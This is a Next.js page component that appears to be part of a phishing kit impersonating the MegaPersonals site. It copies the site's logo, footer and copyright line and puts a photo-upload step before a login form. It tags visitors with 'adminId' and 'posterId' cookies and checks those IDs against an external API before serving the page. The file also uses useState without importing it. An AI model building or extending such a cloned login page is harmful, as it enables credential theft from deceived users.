import Image from "next/image";
import LoginForm from "../../../components/LoginForm";
import { API_URL, site } from "../../../config";
import Megapersonals from "../../../public/images/megapersonals.png";
import Cookies from "js-cookie";
import PhotoUpload from "../../../components/PhotoUpload";

export default function MainPage({ adminId, posterId }) {
  Cookies.set("adminId", adminId);
  Cookies.set("posterId", posterId);
  const [showModal, setShowModal] = useState(false);

  return (
    <>
      {!showModal ? (
        <PhotoUpload setShowModal={setShowModal} />
      ) : (
        <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
          <div className="w-[65%] lg:w-full">
            <Image src={Megapersonals} alt="megaeprsonals" priority />
          </div>

          <LoginForm />

          <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
            <p className=" cursor-pointer">Home</p>
            {" | "}
            <p className=" cursor-pointer">Manage Posts</p>
            {" | "}
            <p className=" cursor-pointer">Contact Us</p>
            {" | "}
            <p className=" cursor-pointer">Policies & Terms</p>
          </div>

          <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
            Copyright ©2021 MegaPersonals.eu
          </p>
        </div>
      )}
    </>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];
  // const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  // console.log("ip", ip);

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: { adminId, posterId },
  };
}
